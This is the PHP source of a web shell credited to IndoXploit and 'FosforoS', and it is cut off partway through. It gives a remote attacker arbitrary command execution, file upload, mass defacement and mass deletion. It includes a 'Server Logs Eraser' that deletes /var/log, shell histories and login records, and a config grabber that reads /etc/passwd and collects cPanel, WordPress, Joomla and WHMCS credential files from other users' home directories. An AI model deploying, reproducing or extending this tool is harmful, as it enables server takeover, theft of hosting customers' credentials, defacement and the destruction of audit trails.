<?php
###############################################################################
// Thanks buat Orang-orang yg membantu dalam proses pembuatan shell ini.
// Shell ini tidak sepenuhnya 100% Coding manual, ada beberapa function dan tools kita ambil dari shell yang sudah ada.
// Tapi Selebihnya, itu hasil kreasi IndoXploit sendiri.
// Tanpa kalian kita tidak akan BESAR seperti sekarang.
// Greetz: All Member IndoXploit. & all my friends.
// #Recode by FosforoS
// use filename.php?FosforoS
###############################################################################
if(isset($_GET["FosforoS"])){
echo"<style type='text/css'>
@import url(https://fonts.googleapis.com/css?family=Ubuntu);
html {
    background: #000000;
    color: silver;
    font-family: 'Ubuntu';
	font-size: 13px;
	width: 100%;
}
li {
	display: inline;
	margin: 5px;
	padding: 5px;
}th, td {
	border-collapse:collapse;
	font-family: Tahoma, Geneva, sans-serif;
	background: transparent;
	font-family: 'Ubuntu';
	font-size: 13px;
}
tr:hover{ background:darkred;
cursor:pointer; 
}
.table_home, .th_home, .td_home {
	border: 1px solid darkred;
}
.th_home1 {
	background: darkred;
}
th {
	padding: 10px;
}
a {
	color: silver;
	text-decoration: none;
}
a:hover {
	color: white;
	text-decoration: none;
}
b {
	color: white;
}
input[type=text], input[type=password],input[type=submit] {
	background: transparent; 
	color: silver; 
	border: 1px solid silver; 
	margin: 5px auto;
	padding-left: 5px;
	font-family: 'Ubuntu';
	font-size: 13px;
}
textarea {
	border: 1px solid silver;
	width: 100%;
	height: 400px;
	padding-left: 5px;
	margin: 10px auto;
	resize: none;
	background: transparent;
	color: silver;
	font-family: 'Ubuntu';
	font-size: 13px;
}
select {
	width: 152px;
	background: #000000; 
	color: lime; 
	border: 1px solid silver; 
	margin: 5px auto;
	padding-left: 5px;
	font-family: 'Ubuntu';
	font-size: 13px;
}
option:hover {
	background: lime;
	color: #000000;
}
</style>";
set_time_limit(0);
error_reporting(0);

function w($dir,$perm) {
	if(!is_writable($dir)) {
		return "<font color=red>".$perm."</font>";
	} else {
		return "<font color=lime>".$perm."</font>";
	}
}
function r($dir,$perm) {
	if(!is_readable($dir)) {
		return "<font color=red>".$perm."</font>";
	} else {
		return "<font color=lime>".$perm."</font>";
	}
}
function exe($cmd) {
	if(function_exists('system')) { 		
		@ob_start(); 		
		@system($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('exec')) { 		
		@exec($cmd,$results); 		
		$buff = ""; 		
		foreach($results as $result) { 			
			$buff .= $result; 		
		} return $buff; 	
	} elseif(function_exists('passthru')) { 		
		@ob_start(); 		
		@passthru($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('shell_exec')) { 		
		$buff = @shell_exec($cmd); 		
		return $buff; 	
	} 
}
function perms($file){
	$perms = fileperms($file);
	if (($perms & 0xC000) == 0xC000) {
	// Socket
	$info = 's';
	} elseif (($perms & 0xA000) == 0xA000) {
	// Symbolic Link
	$info = 'l';
	} elseif (($perms & 0x8000) == 0x8000) {
	// Regular
	$info = '-';
	} elseif (($perms & 0x6000) == 0x6000) {
	// Block special
	$info = 'b';
	} elseif (($perms & 0x4000) == 0x4000) {
	// Directory
	$info = 'd';
	} elseif (($perms & 0x2000) == 0x2000) {
	// Character special
	$info = 'c';
	} elseif (($perms & 0x1000) == 0x1000) {
	// FIFO pipe
	$info = 'p';
	} else {
	// Unknown
	$info = 'u';
	}
		// Owner
	$info .= (($perms & 0x0100) ? 'r' : '-');
	$info .= (($perms & 0x0080) ? 'w' : '-');
	$info .= (($perms & 0x0040) ?
	(($perms & 0x0800) ? 's' : 'x' ) :
	(($perms & 0x0800) ? 'S' : '-'));
	// Group
	$info .= (($perms & 0x0020) ? 'r' : '-');
	$info .= (($perms & 0x0010) ? 'w' : '-');
	$info .= (($perms & 0x0008) ?
	(($perms & 0x0400) ? 's' : 'x' ) :
	(($perms & 0x0400) ? 'S' : '-'));
	// World
	$info .= (($perms & 0x0004) ? 'r' : '-');
	$info .= (($perms & 0x0002) ? 'w' : '-');
	$info .= (($perms & 0x0001) ?
	(($perms & 0x0200) ? 't' : 'x' ) :
	(($perms & 0x0200) ? 'T' : '-'));
	return $info;
}
function hdd($s) {
	if($s >= 1073741824)
	return sprintf('%1.2f',$s / 1073741824 ).' GB';
	elseif($s >= 1048576)
	return sprintf('%1.2f',$s / 1048576 ) .' MB';
	elseif($s >= 1024)
	return sprintf('%1.2f',$s / 1024 ) .' KB';
	else
	return $s .' B';
}
function ambilKata($param, $kata1, $kata2){
    if(strpos($param, $kata1) === FALSE) return FALSE;
    if(strpos($param, $kata2) === FALSE) return FALSE;
    $start = strpos($param, $kata1) + strlen($kata1);
    $end = strpos($param, $kata2, $start);
    $return = substr($param, $start, $end - $start);
    return $return;
}
function getsource($url) {
    $curl = curl_init($url);
    		curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    		curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
    		curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    		curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
    $content = curl_exec($curl);
    		curl_close($curl);
    return $content;
}
if(get_magic_quotes_gpc()) {
	function FosforoS_ss($array) {
		return is_array($array) ? array_map('FosforoS_ss', $array) : stripslashes($array);
	}
	$_POST = FosforoS_ss($_POST);
	$_COOKIE = FosforoS_ss($_COOKIE);
}
if(isset($_GET['dir'])) {
	$dir = $_GET['dir'];
	chdir($dir);
} else {
	$dir = getcwd();
}
$kernel = php_uname();
$ip = gethostbyname($_SERVER['HTTP_HOST']);
$dir = str_replace("\\","/",$dir);
$scdir = explode("/", $dir);
$freespace = hdd(disk_free_space("/"));
$total = hdd(disk_total_space("/"));
$used = $total - $freespace;
$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? "<font color=red>ON</font>" : "<font color=lime>OFF</font>";
$ds = @ini_get("disable_functions");
$mysql = (function_exists('mysql_connect')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$curl = (function_exists('curl_version')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$wget = (exe('wget --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$perl = (exe('perl --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$python = (exe('python --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$show_ds = (!empty($ds)) ? "<font color=red>$ds</font>" : "<font color=lime>NONE</font>";
if(!function_exists('posix_getegid')) {
	$user = @get_current_user();
	$uid = @getmyuid();
	$gid = @getmygid();
	$group = "?";
} else {
	$uid = @posix_getpwuid(posix_geteuid());
	$gid = @posix_getgrgid(posix_getegid());
	$user = $uid['name'];
	$uid = $uid['uid'];
	$group = $gid['name'];
	$gid = $gid['gid'];
}
echo "System: <font color=silver>".$kernel."</font><br>";
echo "User: <font color=silver>".$user."</font> (".$uid.") Group: <font color=silver>".$group."</font> (".$gid.")<br>";
echo "Server IP: <font color=silver>".$ip."</font> | Your IP: <font color=silver>".$_SERVER['REMOTE_ADDR']."</font><br>";
echo "HDD: <font color=silver>$used</font> / <font color=silver>$total</font> ( Free: <font color=silver>$freespace</font> )<br>";
echo "Safe Mode: $sm<br>";
echo "Disable Functions: $show_ds<br>";
echo "MySQL: $mysql | Perl: $perl | Python: $python | WGET: $wget | CURL: $curl <br>";
echo "Current DIR: ";
foreach($scdir as $c_dir => $cdir) {	
	echo "<a href='?FosforoS&dir=";
	for($i = 0; $i <= $c_dir; $i++) {
		echo $scdir[$i];
		if($i != $c_dir) {
		echo "/";
		}
	}
	echo "'>$cdir</a>/";
}
echo "&nbsp;&nbsp;[ ".w($dir, perms($dir))." ]";
echo "<br><br><table width='100%' class='table_home' border='0' cellpadding='3' cellspacing='1' align='center'><tr>";
echo "<th class='th_home1'><a href='?FosforoS'>Home</a> ";
echo "<th class='th_home1'><a href='?FosforoS&dir=$dir&do=upload'>Upload</a> ";
echo "<th class='th_home1'><a href='?FosforoS&dir=$dir&do=cmd'>Command</a> ";
echo "<th class='th_home1'><a href='?FosforoS&dir=$dir&do=mass_deface'>Mass Deface</a> ";
echo "<th class='th_home1'><a href='?FosforoS&dir=$dir&do=mass_delete'>Mass Delete</a> ";
echo "<th class='th_home1'><a href='?FosforoS&dir=$dir&do=config'>Config</a> ";
echo "<th class='th_home1'><a href='?FosforoS&dir=$dir&do=jumping'>Jumping</a> ";
echo "<th class='th_home1'><a href='?FosforoS&dir=$dir&do=cpanel'>CPanel Crack</a> ";
echo "<th class='th_home1'><a href='?FosforoS&dir=$dir&do=smtp'>SMTP Grabber</a> ";
echo "<th class='th_home1'><a href='?FosforoS&dir=$dir&do=network'>network</a> ";
echo "<th class='th_home1'><a href='?FosforoS&dir=$dir&do=adminer'>Adminer</a> ";
echo "<th class='th_home1'><a href='?FosforoS&dir=$dir&do=krdp_shell'>K-RDP Shell</a> ";
echo "<th class='th_home1'><a href='?FosforoS&dir=$dir&do=sle'>Server Logs Eraser</a> ";
echo "</center>";
echo "</tr></table><br>";
if($_GET['do'] == 'upload') {
	echo "<center>";
	if($_POST['upload']) {
		if($_POST['tipe_upload'] == 'biasa') {
			if(@copy($_FILES['ix_file']['tmp_name'], "$dir/".$_FILES['ix_file']['name']."")) {
				$act = "<font color=lime>Uploaded!</font> at <i><b>$dir/".$_FILES['ix_file']['name']."</b></i>";
			} else {
				$act = "<font color=red>failed to upload file</font>";
			}
		} else {
			$root = $_SERVER['DOCUMENT_ROOT']."/".$_FILES['ix_file']['name'];
			$web = $_SERVER['HTTP_HOST']."/".$_FILES['ix_file']['name'];
			if(is_writable($_SERVER['DOCUMENT_ROOT'])) {
				if(@copy($_FILES['ix_file']['tmp_name'], $root)) {
					$act = "<font color=lime>Uploaded!</font> at <i><b>$root -> </b></i><a href='http://$web' target='_blank'>$web</a>";
				} else {
					$act = "<font color=red>failed to upload file</font>";
				}
			} else {
				$act = "<font color=red>failed to upload file</font>";
			}
		}
	}
	echo "Upload File:
	<form method='post' enctype='multipart/form-data'>
	<input type='radio' name='tipe_upload' value='biasa' checked>Biasa [ ".w($dir,"Writeable")." ] 
	<input type='radio' name='tipe_upload' value='home_root'>home_root [ ".w($_SERVER['DOCUMENT_ROOT'],"Writeable")." ]<br>
	<input type='file' name='ix_file'>
	<input type='submit' value='upload' name='upload'>
	</form>";
	echo $act;
	echo "</center>";
} elseif($_GET['do'] == 'cmd') {
	echo "<form method='post'>
	<font style='text-decoration: none;'>".$user."@".$ip.": ~ $ </font>
	<input type='text' size='30' height='10' name='cmd'><input type='submit' name='do_cmd' value='>>'>
	</form>";
	if($_POST['do_cmd']) {
		echo "<pre>".exe($_POST['cmd'])."</pre>";
	}
} elseif($_GET['do'] == 'sle') {
	echo "<center><font color='009900' size='5' face='Impact'>Server Logs Eraser By Mauritania Attacker<center><font/>
<p align='center'> 
<div class='tul'><font color='009900'face='Impact, Geneva, sans-serif' style='font-size: 8pt'><font/>
<center><font face='Orbitron' color='red' size='3'>Delete your Trace<font/>
<form method='post'>
<input type='submit' value='Do it Now' name='effacer'>
</form>
</center>
</p>";
	  
if($_POST['effacer'])
{
exec("rm -rf /tmp/logs");
exec("rm -rf /root/.ksh_history");
exec("rm -rf /root/.bash_history");
exec("rm -rf /root/.bash_logout");
exec("rm -rf /usr/local/apache/logs");
exec("rm -rf /usr/local/apache/log");
exec("rm -rf /var/apache/logs");
exec("rm -rf /var/apache/log");
exec("rm -rf /var/run/utmp");
exec("rm -rf /var/logs");
exec("rm -rf /var/log");
exec("rm -rf /var/adm");
exec("rm -rf /etc/wtmp");
exec("rm -rf /etc/utmp");
exec("rm -rf $HISTFILE");
exec("rm -rf /var/log/lastlog");
exec("rm -rf /var/log/wtmp");

shell_exec("rm -rf /tmp/logs");
shell_exec("rm -rf /root/.ksh_history");
shell_exec("rm -rf /root/.bash_history");
shell_exec("rm -rf /root/.bash_logout");
shell_exec("rm -rf /usr/local/apache/logs");
shell_exec("rm -rf /usr/local/apache/log");
shell_exec("rm -rf /var/apache/logs");
shell_exec("rm -rf /var/apache/log");
shell_exec("rm -rf /var/run/utmp");
shell_exec("rm -rf /var/logs");
shell_exec("rm -rf /var/log");
shell_exec("rm -rf /var/adm");
shell_exec("rm -rf /etc/wtmp");
shell_exec("rm -rf /etc/utmp");
shell_exec("rm -rf $HISTFILE");
shell_exec("rm -rf /var/log/lastlog");
shell_exec("rm -rf /var/log/wtmp");

passthru("rm -rf /tmp/logs");
passthru("rm -rf /root/.ksh_history");
passthru("rm -rf /root/.bash_history");
passthru("rm -rf /root/.bash_logout");
passthru("rm -rf /usr/local/apache/logs");
passthru("rm -rf /usr/local/apache/log");
passthru("rm -rf /var/apache/logs");
passthru("rm -rf /var/apache/log");
passthru("rm -rf /var/run/utmp");
passthru("rm -rf /var/logs");
passthru("rm -rf /var/log");
passthru("rm -rf /var/adm");
passthru("rm -rf /etc/wtmp");
passthru("rm -rf /etc/utmp");
passthru("rm -rf $HISTFILE");
passthru("rm -rf /var/log/lastlog");
passthru("rm -rf /var/log/wtmp");

system("rm -rf /tmp/logs");
sleep(2);
echo'Deleted [+].../tmp/logs ';
sleep(2);
system("rm -rf /root/.bash_history");
sleep(2);
echo'<p>Deleted [+].../root/.bash_history </p>';
system("rm -rf /root/.ksh_history");
sleep(2);
echo'<p>Deleted [+].../root/.ksh_history </p>';
system("rm -rf /root/.bash_logout");
sleep(2);
echo'<p>Deleted [+].../root/.bash_logout </p>';
system("rm -rf /usr/local/apache/logs");
sleep(2);
echo'<p>Deleted [+].../usr/local/apache/logs </p>';
system("rm -rf /usr/local/apache/log");
sleep(2);
echo'<p>Deleted [+].../usr/local/apache/log </p>';
system("rm -rf /var/apache/logs");
sleep(2);
echo'<p>Deleted [+].../var/apache/logs </p>';
system("rm -rf /var/apache/log");
sleep(2);
echo'<p>Deleted [+].../var/apache/log </p>';
system("rm -rf /var/run/utmp");
sleep(2);
echo'<p>Deleted [+].../var/run/utmp </p>';
system("rm -rf /var/logs");
sleep(2);
echo'<p>Deleted [+].../var/logs </p>';
system("rm -rf /var/log");
sleep(2);
echo'<p>Deleted [+].../var/log </p>';
system("rm -rf /var/adm");
sleep(2);
echo'<p>Deleted [+].../var/adm </p>';
system("rm -rf /etc/wtmp");
sleep(2);
echo'<p>Deleted [+].../etc/wtmp </p>';
system("rm -rf /etc/utmp");
sleep(2);
echo'<p>Deleted [+].../etc/utmp </p>';
system("rm -rf $HISTFILE");
sleep(2);
echo'<p>Deleted [+]...$HISTFILE </p>'; 
system("rm -rf /var/log/lastlog");
sleep(2);
echo'<p>Deleted [+].../var/log/lastlog </p>';
system("rm -rf /var/log/wtmp");
sleep(2);
echo'<p>Deleted [+].../var/log/wtmp </p>';
sleep(4);
echo '<p>Your Traces Has Been Successfully Erased From the Server';
}
} elseif($_GET['do'] == 'mass_deface') {
	function sabun_massal($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<font color=lime>DONE</font>] $lokasi<br>";
							file_put_contents($lokasi, $isi_script);
							$FosforoS = sabun_massal($dirc,$namafile,$isi_script);
						}
					}
				}
			}
		}
	}
	function sabun_biasa($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<font color=lime>DONE</font>] $dirb/$namafile<br>";
							file_put_contents($lokasi, $isi_script);
						}
					}
				}
			}
		}
	}
	if($_POST['start']) {
		if($_POST['tipe_sabun'] == 'mahal') {
			echo "<div style='margin: 5px auto; padding: 5px'>";
			sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			echo "</div>";
		} elseif($_POST['tipe_sabun'] == 'murah') {
			echo "<div style='margin: 5px auto; padding: 5px'>";
			sabun_biasa($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			echo "</div>";
		}
	} else {
	echo "<center>";
	echo "<form method='post'>
	<font style='text-decoration: none;'>Tipe Sabun:</font><br>
	<input type='radio' name='tipe_sabun' value='murah' checked>Biasa<input type='radio' name='tipe_sabun' value='mahal'>Massal<br>
	<font style='text-decoration: none;'>Folder:</font><br>
	<input type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>
	<font style='text-decoration: none;'>Filename:</font><br>
	<input type='text' name='d_file' value='index.php' style='width: 450px;' height='10'><br>
	<font style='text-decoration: none;'>Index File:</font><br>
	<textarea name='script' style='width: 450px; height: 200px;'>Hacked by FosforoS</textarea><br>
	<input type='submit' name='start' value='Mass Deface' style='width: 450px;'>
	</form></center>";
	}
} elseif($_GET['do'] == 'mass_delete') {
	function hapus_massal($dir,$namafile) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					if(file_exists("$dir/$namafile")) {
						unlink("$dir/$namafile");
					}
				} elseif($dirb === '..') {
					if(file_exists("".dirname($dir)."/$namafile")) {
						unlink("".dirname($dir)."/$namafile");
					}
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							if(file_exists($lokasi)) {
								echo "[<font color=lime>DELETED</font>] $lokasi<br>";
								unlink($lokasi);
								$FosforoS = hapus_massal($dirc,$namafile);
							}
						}
					}
				}
			}
		}
	}
	if($_POST['start']) {
		echo "<div style='margin: 5px auto; padding: 5px'>";
		hapus_massal($_POST['d_dir'], $_POST['d_file']);
		echo "</div>";
	} else {
	echo "<center>";
	echo "<form method='post'>
	<font style='text-decoration: none;'>Folder:</font><br>
	<input type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>
	<font style='text-decoration: none;'>Filename:</font><br>
	<input type='text' name='d_file' value='index.php' style='width: 450px;' height='10'><br>
	<input type='submit' name='start' value='Mass Delete' style='width: 450px;'>
	</form></center>";
	}
} elseif($_GET['do'] == 'config') {
	$etc = fopen("/etc/passwd", "r") or die("<pre><font color=red>Can't read /etc/passwd</font></pre>");
	$FosforoS = mkdir("FosforoS_config", 0777);
	$isi_htc = "Options all\nRequire None\nSatisfy Any";
	$htc = fopen("FosforoS_config/.htaccess","w");
	fwrite($htc, $isi_htc);
	while($passwd = fgets($etc)) {
		if($passwd == "" || !$etc) {
			echo "<font color=red>Can't read /etc/passwd</font>";
		} else {
			preg_match_all('/(.*?):x:/', $passwd, $user_config);
			foreach($user_config[1] as $user_FosforoS) {
				$user_config_dir = "/home/$user_FosforoS/public_html/";
				if(is_readable($user_config_dir)) {
					$grab_config = array(
						"/home/$user_FosforoS/.my.cnf" => "cpanel",
						"/home/$user_FosforoS/.accesshash" => "WHM-accesshash",
						"/home/$user_FosforoS/public_html/po-content/config.php" => "Popoji",
						"/home/$user_FosforoS/public_html/public_html/admin/config.php" => "-shop-os",
						"/home/$user_FosforoS/public_html/public_html/libs/dbconnect.php" => "-TemplateLite",
						"/home/$user_FosforoS/public_html/public_html/includes/configure.php" => "-shop",
						"/home/$user_FosforoS/public_html/public_html/os/includes/configure.php" => "-shop-os",
						"/home/$user_FosforoS/public_html/public_html/oscom/includes/configure.php" => "-oscom",
						"/home/$user_FosforoS/public_html/public_html/oscommerce/includes/configure.php" => "-oscommerce",
						"/home/$user_FosforoS/public_html/public_html/oscommerces/includes/configure.php" => "-oscommerces",
						"/home/$user_FosforoS/public_html/public_html/shop/includes/configure.php" => "-shop2",
						"/home/$user_FosforoS/public_html/public_html/shopping/includes/configure.php" => "-shop-shopping",
						"/home/$user_FosforoS/public_html/public_html/sale/includes/configure.php" => "-sale",
						"/home/$user_FosforoS/public_html/public_html/amember/config.TXT.php" => "-amember",
						"/home/$user_FosforoS/public_html/public_html/config.TXT.php" => "-amember2",
						"/home/$user_FosforoS/public_html/public_html/members/configuration.php" => "-members",
						"/home/$user_FosforoS/public_html/public_html/config.php" => "-4images1",
						"/home/$user_FosforoS/public_html/public_html/forum/includes/config.php" => "-forum",
						"/home/$user_FosforoS/public_html/public_html/forums/includes/config.php" => "-forums",
						"/home/$user_FosforoS/public_html/public_html/admin/conf.php" => "-5",
						"/home/$user_FosforoS/public_html/public_html/admin/config.php" => "-4",
						"/home/$user_FosforoS/public_html/public_html/wp-config.php" => "-wp13",
						"/home/$user_FosforoS/public_html/public_html/wp/wp-config.php" => "-wp13-wp",
						"/home/$user_FosforoS/public_html/public_html/WP/wp-config.php" => "-wp13-WP",
						"/home/$user_FosforoS/public_html/public_html/wp/beta/wp-config.php" => "-wp13-wp-beta",
						"/home/$user_FosforoS/public_html/public_html/beta/wp-config.php" => "-wp13-beta",
						"/home/$user_FosforoS/public_html/public_html/press/wp-config.php" => "-wp13-press",
						"/home/$user_FosforoS/public_html/public_html/wordpress/wp-config.php" => "-wp13-wordpress",
						"/home/$user_FosforoS/public_html/public_html/Wordpress/wp-config.php" => "-wp13-Wordpress",
						"/home/$user_FosforoS/public_html/public_html/blog/wp-config.php" => "-wp13-Wordpress",
						"/home/$user_FosforoS/public_html/public_html/wordpress/beta/wp-config.php" => "-wp13-wordpress-beta",
						"/home/$user_FosforoS/public_html/public_html/news/wp-config.php" => "-wp13-news",
						"/home/$user_FosforoS/public_html/public_html/new/wp-config.php" => "-wp13-new",
						"/home/$user_FosforoS/public_html/public_html/blog/wp-config.php" => "-wp-blog",
						"/home/$user_FosforoS/public_html/public_html/beta/wp-config.php" => "-wp-beta",
						"/home/$user_FosforoS/public_html/public_html/blogs/wp-config.php" => "-wp-blogs",
						"/home/$user_FosforoS/public_html/public_html/home/wp-config.php" => "-wp-home",
						"/home/$user_FosforoS/public_html/public_html/protal/wp-config.php" => "-wp-protal",
						"/home/$user_FosforoS/public_html/public_html/site/wp-config.php" => "-wp-site",
						"/home/$user_FosforoS/public_html/public_html/main/wp-config.php" => "-wp-main",
						"/home/$user_FosforoS/public_html/public_html/test/wp-config.php" => "-wp-test",
						"/home/$user_FosforoS/public_html/public_html/arcade/functions/dbclass.php" => "-ibproarcade",
						"/home/$user_FosforoS/public_html/public_html/joomla/configuration.php" => "-joomla2",
						"/home/$user_FosforoS/public_html/public_html/protal/configuration.php" => "-joomla-protal",
						"/home/$user_FosforoS/public_html/public_html/joo/configuration.php" => "-joo",
						"/home/$user_FosforoS/public_html/public_html/cms/configuration.php" => "-joomla-cms",
						"/home/$user_FosforoS/public_html/public_html/site/configuration.php" => "-joomla-site",
						"/home/$user_FosforoS/public_html/public_html/main/configuration.php" => "-joomla-main",
						"/home/$user_FosforoS/public_html/public_html/news/configuration.php" => "-joomla-news",
						"/home/$user_FosforoS/public_html/public_html/new/configuration.php" => "-joomla-new",
						"/home/$user_FosforoS/public_html/public_html/home/configuration.php" => "-joomla-home",
						"/home/$user_FosforoS/public_html/public_html/vb/includes/config.php" => "-vb-config",
						"/home/$user_FosforoS/public_html/public_html/vb3/includes/config.php" => "-vb3-config",
						"/home/$user_FosforoS/public_html/public_html/cc/includes/config.php" => "-vb1-config",
						"/home/$user_FosforoS/public_html/public_html/includes/config.php" => "-includes-vb",
						"/home/$user_FosforoS/public_html/public_html/configuration.php" => "-joomla",
						"/home/$user_FosforoS/public_html/public_html/includes/dist-configure.php" => "-zencart",
						"/home/$user_FosforoS/public_html/public_html/zencart/includes/dist-configure.php" => "-shop-zencart",
						"/home/$user_FosforoS/public_html/public_html/shop/includes/dist-configure.php" => "-shop-ZCshop",
						"/home/$user_FosforoS/public_html/public_html/Settings.php" => "-smf",
						"/home/$user_FosforoS/public_html/public_html/smf/Settings.php" => "-smf2",
						"/home/$user_FosforoS/public_html/public_html/forum/Settings.php" => "-smf-forum",
						"/home/$user_FosforoS/public_html/public_html/forums/Settings.php" => "-smf-forums",
						"/home/$user_FosforoS/public_html/public_html/upload/includes/config.php" => "-up",
						"/home/$user_FosforoS/public_html/public_html/article/config.php" => "-Nwahy",
						"/home/$user_FosforoS/public_html/public_html/up/includes/config.php" => "-up2",
						"/home/$user_FosforoS/public_html/public_html/conf_global.php" => "-6",
						"/home/$user_FosforoS/public_html/public_html/include/db.php" => "-7",
						"/home/$user_FosforoS/public_html/public_html/connect.php" => "-PHP-Fusion",
						"/home/$user_FosforoS/public_html/public_html/mk_conf.php" => "-9",
						"/home/$user_FosforoS/public_html/public_html/includes/config.php" => "-traidnt1",
						"/home/$user_FosforoS/public_html/public_html/config.php" => "-4images",
						"/home/$user_FosforoS/public_html/public_html/sites/default/settings.php" => "-Drupal",
						"/home/$user_FosforoS/public_html/public_html/drupal/sites/default/settings.php" => "-Drupal",
						"/home/$user_FosforoS/public_html/public_html/sites/default/dbconfig.php" => "dbconfig",
						"/home/$user_FosforoS/public_html/public_html/member/configuration.php" => "-1member",
						"/home/$user_FosforoS/public_html/public_html/supports/includes/iso4217.php" => "-hostbills-supports",
						"/home/$user_FosforoS/public_html/public_html/client/includes/iso4217.php" => "-hostbills-client",
						"/home/$user_FosforoS/public_html/public_html/support/includes/iso4217.php" => "-hostbills-support",
						"/home/$user_FosforoS/public_html/public_html/billing/includes/iso4217.php" => "-hostbills-billing",
						"/home/$user_FosforoS/public_html/public_html/billings/includes/iso4217.php" => "-hostbills-billings",
						"/home/$user_FosforoS/public_html/public_html/host/includes/iso4217.php" => "-hostbills-host",
						"/home/$user_FosforoS/public_html/public_html/hosts/includes/iso4217.php" => "-hostbills-hosts",
						"/home/$user_FosforoS/public_html/public_html/hosting/includes/iso4217.php" => "-hostbills-hosting",
						"/home/$user_FosforoS/public_html/public_html/hostings/includes/iso4217.php" => "-hostbills-hostings",
						"/home/$user_FosforoS/public_html/public_html/includes/iso4217.php" => "-hostbills",
						"/home/$user_FosforoS/public_html/public_html/hostbills/includes/iso4217.php" => "-hostbills-hostbills",
						"/home/$user_FosforoS/public_html/public_html/hostbill/includes/iso4217.php" => "-hostbills-hostbill",
						"/home/$user_FosforoS/public_html/public_html/cart/configuration.php" => "-cart-WHMCS",
						"/home/$user_FosforoS/public_html/public_html/hosting/configuration.php" => "-hosting-WHMCS",
						"/home/$user_FosforoS/public_html/public_html/buy/configuration.php" => "-buy-WHMCS",
						"/home/$user_FosforoS/public_html/public_html/checkout/configuration.php" => "-checkout-WHMCS",
						"/home/$user_FosforoS/public_html/public_html/host/configuration.php" => "-host-WHMCS",
						"/home/$user_FosforoS/public_html/public_html/shop/configuration.php" => "-shop-WHMCS",
						"/home/$user_FosforoS/public_html/public_html/shopping/configuration.php" => "-shopping-WHMCS",
						"/home/$user_FosforoS/public_html/public_html/sale/configuration.php" => "-sale-WHMCS",
						"/home/$user_FosforoS/public_html/public_html/client/configuration.php" => "-client-WHMCS",
						"/home/$user_FosforoS/public_html/public_html/support/configuration.php" => "-support-WHMCS",
						"/home/$user_FosforoS/public_html/public_html/clientsupport/configuration.php" => "-clientsupport-WHMCS",
						"/home/$user_FosforoS/public_html/public_html/whm/whmcs/configuration.php" => "-whm-whmcs",
						"/home/$user_FosforoS/public_html/public_html/whm/WHMCS/configuration.php" => "-whm-WHMCS",
						"/home/$user_FosforoS/public_html/public_html/whmc/WHM/configuration.php" => "-whmc-WHM",
						"/home/$user_FosforoS/public_html/public_html/whmcs/configuration.php" => "-whmc-WHMCS",
						"/home/$user_FosforoS/public_html/public_html/supp/configuration.php" => "-supp-WHMCS",
						"/home/$user_FosforoS/public_html/public_html/secure/configuration.php" => "-sucure-WHMCS",
						"/home/$user_FosforoS/public_html/public_html/secure/whm/configuration.php" => "-sucure-whm-WHMCS",
						"/home/$user_FosforoS/public_html/public_html/secure/whmcs/configuration.php" => "-sucure-whmcs-WHMCS",
						"/home/$user_FosforoS/public_html/public_html/panel/configuration.php" => "-panel-WHMCS",
						"/home/$user_FosforoS/public_html/public_html/hosts/configuration.php" => "-hosts-WHMCS",
						"/home/$user_FosforoS/public_html/public_html/submitticket.php" => "-submitticket-WHMCS",
						"/home/$user_FosforoS/public_html/public_html/clients/configuration.php" => "-clients-WHMCS",
						"/home/$user_FosforoS/public_html/public_html/clientes/configuration.php" => "-clientes-WHMCS",
						"/home/$user_FosforoS/public_html/public_html/cliente/configuration.php" => "-client-WHMCS",
						"/home/$user_FosforoS/public_html/public_html/billing/configuration.php" => "-billing-WHMCS",
						"/home/$user_FosforoS/public_html/public_html/manage/configuration.php" => "-whm-manage-WHMCS",
						"/home/$user_FosforoS/public_html/public_html/my/configuration.php" => "-whm-my-WHMCS",
						"/home/$user_FosforoS/public_html/public_html/myshop/configuration.php" => "-whm-myshop-WHMCS",
						"/home/$user_FosforoS/public_html/public_html/billings/configuration.php" => "-billings-WHMCS",
						"/home/$user_FosforoS/public_html/public_html/supports/configuration.php" => "-supports-WHMCS",
						"/home/$user_FosforoS/public_html/public_html/auto/configuration.php" => "-auto-WHMCS",
						"/home/$user_FosforoS/public_html/public_html/go/configuration.php" => "-go-WHMCS",
						"/home/$user_FosforoS/public_html/public_html/' . $user . '/configuration.php" => "-USERNAME-WHMCS",
						"/home/$user_FosforoS/public_html/public_html/bill/configuration.php" => "-bill-WHMCS",
						"/home/$user_FosforoS/public_html/public_html/payment/configuration.php" => "-payment-WHMCS",
						"/home/$user_FosforoS/public_html/public_html/pay/configuration.php" => "-pay-WHMCS",
